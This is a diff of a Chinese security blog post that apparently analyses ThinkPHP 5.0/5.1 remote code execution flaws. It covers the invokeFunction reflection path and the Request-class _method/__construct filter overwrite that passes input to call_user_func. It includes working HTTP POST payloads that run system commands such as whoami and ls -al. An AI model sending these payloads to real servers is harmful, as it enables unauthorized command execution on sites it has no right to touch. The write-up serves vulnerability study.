@@ -137,21 +137,39 @@
 <p>加了个限制大小写字母的过滤。从官方文档可以知道，获取控制器的方式取决于用的哪种路由模式，ThinkPHP默认无强制路由、支持兼容模式，SQL注入篇中都是用的<code>?s=/模块/控制器/方法</code>这种Payload，此处可以合理猜测能够调用到危险方法。</p>
 <p>将源码更新为5.0.22，直接全局搜索<code>eval</code>、<code>assert</code>和<code>system</code>这类赤果果的关键词基本没得搞头，但是搜回调类、反射类的函数就会眼前一亮。</p>
 <p><img src="/img/tp5ldfxrce_b.png"></p>
-<p>以<code>reflect</code>为例搜到的App类（thinkphp/library/think/App.php）第一条结果就是一个静态<code>invokeFunction</code>方法，<code>invokeArgs</code>方法类似<code>call_user_func_array</code>函数，只要<code>$function</code>和<code>$args</code>可控就能实现控制任意函数和参数代码执行了。</p>
-<p><img src="/img/tp5ldfxrce_c.png"></p>
-<p>跟进<code>self::bindParams</code>方法可以看到它的作用就是获取传入的参数，通过完全限定名称的命名空间调用并无脑传参就行了。</p>
+<p>以<code>reflect</code>为例搜到的App类（thinkphp/library/think/App.php）第一条结果就是一个静态<code>invokeFunction</code>方法，<code>invokeArgs</code>方法类似<code>call_user_func_array</code>函数，只要<code>$function</code>和<code>$args</code>可控就能实现控制任意函数和参数代码执行了。跟进<code>self::bindParams</code>方法可以看到它的作用就是获取传入的参数，通过完全限定名称的命名空间调用并无脑传参就行了。</p>
 <p><img src="/img/tp5ldfxrce_d.png"></p>
 <p>5.1版本的利用方法类似而且能利用的类比5.0更多，官方正则判断的修复方式就是卡了命名空间的逃逸。</p>
+<ul>
+<li><code>$_SERVER[&#39;PATH_INFO&#39;]</code>会将<code>\</code>转为<code>/</code></li>
+</ul>
 <h2 id="代码执行2"><a href="#代码执行2" class="headerlink" title="代码执行2"></a>代码执行2</h2><p>影响版本：</p>
 <ul>
 <li>5.0.0&lt;=ThinkPHP5&lt;=5.0.23</li>
 <li>5.1.0&lt;=ThinkPHP&lt;=5.1.30</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># ThinkPHP &lt;&#x3D; 5.0.13</span><br><span class="line">POST &#x2F;?s&#x3D;index&#x2F;index</span><br><span class="line">s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;&amp;filter[]&#x3D;system</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23、5.1.0 &lt;&#x3D; 5.1.16 需要开启框架app_debug</span><br><span class="line">POST &#x2F;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23 需要存在xxx的method路由，例如captcha</span><br><span class="line">POST &#x2F;?s&#x3D;xxx HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;ls+-al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># ThinkPHP &lt;&#x3D; 5.0.13</span><br><span class="line">POST &#x2F;?s&#x3D;index&#x2F;index</span><br><span class="line">sss&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;&amp;filter[]&#x3D;system</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23、5.1.0 &lt;&#x3D; 5.1.16 需要开启框架app_debug</span><br><span class="line">POST &#x2F;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23 需要存在xxx的method路由，例如captcha</span><br><span class="line">POST &#x2F;?s&#x3D;xxx HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;ls -al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br></pre></td></tr></table></figure>
 
 <h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a target="_blank" rel="noopener" href="https://github.com/top-think/framework/releases?after=v5.1.33">5.0.24</a>版本更新说明中表示包含一个安全更新，具体看到<a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003">改进Request类</a>这个commit</p>
-<p>挖坑待填</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://github.com/Mochazz/ThinkPHP-Vuln/tree/master/ThinkPHP5">ThinkPHP-Vuln</a></p>
+<p><img src="/img/tp5ldfxrce_e.png"></p>
+<p>调用<code>Request</code>类方法前做了白名单判断，猜测漏洞可能是能调用当前类任意方法，找到<code>Config::get(&#39;var_method&#39;)</code>对应的值为<code>_method</code>。</p>
+<p><img src="/img/tp5ldfxrce_f.png"></p>
+<p>回顾一下SQL注入篇中说过<code>凡是使用框架提供的请求变量获取方法(Request类param方法及input助手函数)，都会经过这个filterExp方法的过滤</code>，其中的<code>filterExp</code>方法是被<code>filterValue</code>方法拉起调用的，而<code>filterValue</code>方法中就存在敏感函数<code>call_user_func</code>：</p>
+<p><img src="/img/tp5ldfxrce_g.png"></p>
+<p>全局搜索对应的<code>filterValue</code>方法，看到可以由824行的<code>cookie</code>方法或是由994行的<code>input</code>方法触发（但是似乎框架默认逻辑没有用到<code>cookie</code>方法）。</p>
+<p><img src="/img/tp5ldfxrce_h.png"></p>
+<p>于是继续向上跟进<code>array_walk_recursive</code>函数传递的第一和第三个参数，进而寻找调用了<code>input</code>方法的地方（<code>-&gt;input\(|::input\(</code>）：</p>
+<p><img src="/img/tp5ldfxrce_i.png"></p>
+<p>这个构造函数简直来得不要太妙：如果当前类中的属性名有与<code>$options</code>数组中键名相同的，就会被覆盖为相应的键值，并且给<code>$this-&gt;input</code>属性赋值了完全可控的<code>php://input</code>。</p>
+<p>有很多的地方调用了<code>input</code>方法，先看看靠前且不在白名单数组里的<code>param</code>方法：</p>
+<p><img src="/img/tp5ldfxrce_j.png"></p>
+<p>然而并看不出什么东西:(。。。还有劈叉逻辑。。。继续看看谁翻了<code>param</code>方法的牌子：</p>
+<p>留坑待填</p>
+<p><code>composer require topthink/think-captcha 1.*</code></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/177173">天融信关于ThinkPHP5.1框架结合RCE漏洞的深入分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Mochazz/ThinkPHP-Vuln/tree/master/ThinkPHP5">ThinkPHP-Vuln</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1377/">ThinkPHP 组件漏洞与攻击链分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://0kee.360.cn/blog/thinkphp-5-x-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">THINKPHP 5.X RCE 漏洞分析与利用总结</a></p>
 
       </div>
       
